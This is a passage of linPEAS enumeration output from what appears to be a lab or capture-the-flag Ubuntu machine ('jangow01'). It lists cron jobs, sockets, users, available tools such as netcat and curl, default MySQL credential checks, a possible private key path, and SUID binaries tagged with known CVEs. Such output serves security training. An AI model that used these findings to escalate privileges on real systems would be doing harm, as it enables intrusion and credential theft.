Proc 28233 with ppid 28223 is run by user jangow01 but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                           
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                                            

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                           
gdm-password Not Found                                                                                                                                                       
gnome-keyring-daemon Not Found                                                                                                                                               
lightdm Not Found                                                                                                                                                            
vsftpd process found (dump creds from memory as root)                                                                                                                        
apache2 process found (dump creds from memory as root)
sshd Not Found
                                                                                                                                                                             
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                       
/usr/bin/crontab                                                                                                                                                             
incrontab Not Found
-rw-r--r-- 1 root root     722 Abr  5  2016 /etc/crontab                                                                                                                     

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jun 10  2021 .
drwxr-xr-x 92 root root 4096 Out 31  2021 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  102 Abr  5  2016 .placeholder
-rw-r--r--  1 root root  190 Jun 10  2021 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Jun 10  2021 .
drwxr-xr-x 92 root root 4096 Out 31  2021 ..
-rwxr-xr-x  1 root root  539 Jul 15  2020 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root  920 Abr  5  2016 apt-compat
-rwxr-xr-x  1 root root  355 Mai 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 Mai  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Abr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Fev 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 Mai 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 10  2021 .
drwxr-xr-x 92 root root 4096 Out 31  2021 ..
-rw-r--r--  1 root root  102 Abr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 10  2021 .
drwxr-xr-x 92 root root 4096 Out 31  2021 ..
-rw-r--r--  1 root root  102 Abr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Jun 10  2021 .
drwxr-xr-x 92 root root 4096 Out 31  2021 ..
-rwxr-xr-x  1 root root   86 Abr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Abr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 Mai 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                               
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                            

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                  
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path                                                                         
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
/etc/systemd/system/sysinit.target.wants/friendly-recovery.service could be executing some relative path
/lib/systemd/system/emergency.service could be executing some relative path
/lib/systemd/system/friendly-recovery.service could be executing some relative path
/lib/systemd/system/ifup@.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                    
NEXT                         LEFT          LAST                         PASSED   UNIT                         ACTIVATES                                                      
Arquivo binário (entrada padrão) coincide com o padrão

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                    
                                                                                                                                                                             
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                   
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                  
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                   
/run/acpid.socket                                                                                                                                                            
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                     
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                       
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                     
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                     
:1.0                                   1 systemd         root             :1.0          init.scope                -          -                  
:1.1                                1876 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.11                               4269 busctl          jangow01         :1.11         session-c1.scope          c1         -                  
:1.2                                1873 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
:1.3                                1931 polkitd         root             :1.3          polkitd.service           -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts            1873 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus                1849 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.PolicyKit1          1931 polkitd         root             :1.3          polkitd.service           -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1              1876 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.network1               - -               -                (activatable) -                         -         
org.freedesktop.resolve1               - -               -                (activatable) -                         -         
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                          
                              ╚═════════════════════╝                                                                                                                        
╔══════════╣ Hostname, hosts and DNS
jangow01                                                                                                                                                                     
127.0.0.1       localhost
127.0.1.1       desafio02

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
dnsdomainname Not Found
                                                                                                                                                                             
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                          
link-local 169.254.0.0
enp0s17   Link encap:Ethernet  Endereço de HW 08:00:27:d1:40:7d  
          inet end.: 192.168.56.118  Bcast:192.168.56.255  Masc:255.255.255.0
          endereço inet6: fe80::a00:27ff:fed1:407d/64 Escopo:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Métrica:1
          pacotes RX:1218054 erros:0 descartados:0 excesso:0 quadro:0
          Pacotes TX:967169 erros:0 descartados:0 excesso:0 portadora:0
          colisões:0 txqueuelen:1000 
          RX bytes:114092207 (114.0 MB) TX bytes:190657516 (190.6 MB)

lo        Link encap:Loopback Local  
          inet end.: 127.0.0.1  Masc:255.0.0.0
          endereço inet6: ::1/128 Escopo:Máquina
          UP LOOPBACK RUNNING  MTU:65536  Métrica:1
          pacotes RX:376478 erros:0 descartados:0 excesso:0 quadro:0
          Pacotes TX:376478 erros:0 descartados:0 excesso:0 portadora:0
          colisões:0 txqueuelen:1 
          RX bytes:28101440 (28.1 MB) TX bytes:28101440 (28.1 MB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                
                                                                                                                                                                             
╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                           
                                                                                                                                                                             


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                          
                               ╚═══════════════════╝                                                                                                                         
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                     
uid=1000(jangow01) gid=1000(desafio02) grupos=1000(desafio02)                                                                                                                

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                 
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                             
                                                                                                                                                                             
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                             
                                                                                                                                                                             
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                       
ptrace protection is enabled (1)                                                                                                                                             

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                   
                                                                                                                                                                             
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                              

╔══════════╣ Users with console
jangow01:x:1000:1000:desafio02,,,:/home/jangow01:/bin/bash                                                                                                                   
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) grupos=0(root)                                                                                                                                       
uid=1000(jangow01) gid=1000(desafio02) grupos=1000(desafio02)
uid=100(systemd-timesync) gid=102(systemd-timesync) grupos=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) grupos=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) grupos=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) grupos=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) grupos=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) grupos=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) grupos=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) grupos=111(messagebus)
uid=108(uuidd) gid=112(uuidd) grupos=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) grupos=65534(nogroup)
uid=10(uucp) gid=10(uucp) grupos=10(uucp)
uid=110(sshd) gid=65534(nogroup) grupos=65534(nogroup)
uid=111(ftp) gid=118(ftp) grupos=118(ftp)
uid=112(mysql) gid=119(mysql) grupos=119(mysql)
uid=13(proxy) gid=13(proxy) grupos=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) grupos=1(daemon[0m)
uid=2(bin) gid=2(bin) grupos=2(bin)
uid=33(www-data) gid=33(www-data) grupos=33(www-data)
uid=34(backup) gid=34(backup) grupos=34(backup)
uid=38(list) gid=38(list) grupos=38(list)
uid=39(irc) gid=39(irc) grupos=39(irc)
uid=3(sys) gid=3(sys) grupos=3(sys)
uid=41(gnats) gid=41(gnats) grupos=41(gnats)
uid=4(sync) gid=65534(nogroup) grupos=65534(nogroup)
uid=5(games) gid=60(games) grupos=60(games)
uid=65534(nobody) gid=65534(nogroup) grupos=65534(nogroup)
uid=6(man) gid=12(man) grupos=12(man)
uid=7(lp) gid=7(lp) grupos=7(lp)
uid=8(mail) gid=8(mail) grupos=8(mail)
uid=9(news) gid=9(news) grupos=9(news)

╔══════════╣ Login now
 09:05:37 up 18:13,  0 users,  load average: 0,67, 0,16, 0,05                                                                                                                
USUÁRIO TTY      DE               LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
desafio02 tty1         Thu Jun 10 18:44:52 2021 - down                      (00:00)     0.0.0.0                                                                              
desafio02 pts/0        Thu Jun 10 17:12:27 2021 - Thu Jun 10 18:44:31 2021  (01:32)     192.168.56.102
reboot   system boot  Thu Jun 10 17:12:11 2021 - Thu Jun 10 18:45:05 2021  (01:32)     0.0.0.0
desafio02 pts/0        Thu Jun 10 16:43:28 2021 - Thu Jun 10 17:11:59 2021  (00:28)     192.168.56.102
desafio02 tty1         Thu Jun 10 16:42:05 2021 - down                      (00:29)     0.0.0.0
reboot   system boot  Thu Jun 10 16:41:42 2021 - Thu Jun 10 17:12:00 2021  (00:30)     0.0.0.0
desafio02 tty1         Thu Jun 10 16:37:33 2021 - crash                     (00:04)     0.0.0.0
reboot   system boot  Thu Jun 10 16:37:08 2021 - Thu Jun 10 17:12:00 2021  (00:34)     0.0.0.0

wtmp begins Thu Jun 10 16:37:08 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                            
root             tty1                      Qua Nov  3 13:51:31 -0200 2021
jangow01         pts/1    192.168.174.128  Dom Out 31 19:39:50 -0200 2021

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                             
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                             


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                           
                             ╚══════════════════════╝                                                                                                                        
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                              
/usr/bin/curl
/usr/bin/gcc
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                4:5.3.1-1ubuntu1                amd64        GNU C compiler                                                                           
ii  gcc-5                              5.4.0-6ubuntu1~16.04.12         amd64        GNU C compiler
ii  shc                                3.8.9b-1                        amd64        Generic shell script compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.33, for Linux (x86_64) using  EditLine wrapper                                                                                                  


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                                   
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                   
                                                                                                                                                                             
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                              
Found readable /etc/mysql/my.cnf                                                                                                                                             
!includedir /etc/mysql/conf.d/                                                                                                                                               
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                             
-rw------- 1 root root 317 Jun 10  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                                                                                       
Server built:   2020-08-12T21:35:50
httpd Not Found
                                                                                                                                                                             
Nginx version: nginx Not Found
                                                                                                                                                                             
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun 11  2021 /etc/apache2/sites-enabled                                                                                                          
drwxr-xr-x 2 root root 4096 Jun 11  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jun 10  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/site
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1365 Jun 11  2021 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/site
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jun 10  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/site
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 70999 Out  8  2020 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Out  8  2020 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Set 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                           
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                         
drwxr-xr-x 2 root root 4096 Jun 10  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                  
                                                                                                                                                                             




-rw-r--r-- 1 root root 604 Jun 10  2021 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 176 Jun 10  2021 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 96 Jun 10  2021 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 396 Jun 10  2021 /etc/ssh/ssh_host_rsa_key.pub

Port 22
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/home/jangow01/.config/lxc/client.key

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                                 
/etc/ssl/certs/ACEDICOM_Root.pem
/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/ApplicationCA_-_Japanese_Government.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_CA_1.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
28349PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                                                                                                                           
AuthorizedKeysFile      .ssh/authorized_keys
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                             


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 10  2021 /etc/pam.d                                                                                                                          
-rw-r--r-- 1 root root 2133 Mai 26  2020 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                                       
tmux 2.1                                                                                                                                                                     


/tmp/tmux-1000
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 10  2021 /usr/share/keyrings                                                                                                                 
drwxr-xr-x 2 root root 4096 Jun 10  2021 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                               
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                 
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                             
                                                                                                                                                                             
-rw-r--r-- 1 root root 12255 Jul 19  2016 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 Mai 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Mai 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 1227 Mai 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Fev 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Jul 19  2016 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 198 Jun 10  2021 /var/lib/apt/lists/Ubuntu-Server%2016.04.1%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20160719)_dists_xenial_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iEYEABEKAAYFAleOmbcACgkQRhgUM/u3VFEjBgCdFxMASKM1I7emSALJPNkpRllF
1VUAn1pImIZzA7mCSUcU1LrUI41EjONC
=joBi
-----END PGP SIGNATURE-----



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 Mai 18  2016 /usr/share/bash-completion/completions/postfix                                                                                       


╔══════════╣ Analyzing FTP Files (limit 70)
-rw-r--r-- 1 root root 5891 Jun 10  2021 /etc/vsftpd.conf                                                                                                                    
anonymous_enable
local_enable=YES
write_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#chown_uploads=YES
#chown_username=whoever
-rw-r--r-- 1 root root 41 Fev 10  2016 /usr/lib/tmpfiles.d/vsftpd.conf
-rw-r--r-- 1 root root 564 Abr 13  2016 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf
anonymous_enable
local_enable
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable
-rw-r--r-- 1 root root 506 Abr 13  2016 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
anonymous_enable
local_enable
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable
-rw-r--r-- 1 root root 260 Fev  1  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
anonymous_enable
local_enable=YES
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable



-rw-r--r-- 1 root root 69 Out  8  2020 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Out  8  2020 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                             





















lrwxrwxrwx 1 root root 20 Jun 10  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jun 10  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Jun 10  2021 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Ago 31  2015 /etc/skel/.bashrc                                                                                                                   
-rw-r--r-- 1 jangow01 desafio02 3771 Jun 10  2021 /home/jangow01/.bashrc





-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile
-rw-r--r-- 1 jangow01 desafio02 655 Jun 10  2021 /home/jangow01/.profile



-rw-r--r-- 1 jangow01 desafio02 0 Jun 10  2021 /home/jangow01/.sudo_as_admin_successful



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                           
                      ╚════════════════════════════════════╝                                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                             
-rwsr-xr-- 1 root messagebus 42K Abr  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                    
-rwsr-xr-x 1 root root 10K Fev 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 39K Jun 30  2016 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 419K Mai 26  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 23K Jan 17  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 39K Mar 29  2016 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 49K Mar 29  2016 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 53K Mar 29  2016 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 33K Mar 29  2016 /usr/bin/newuidmap
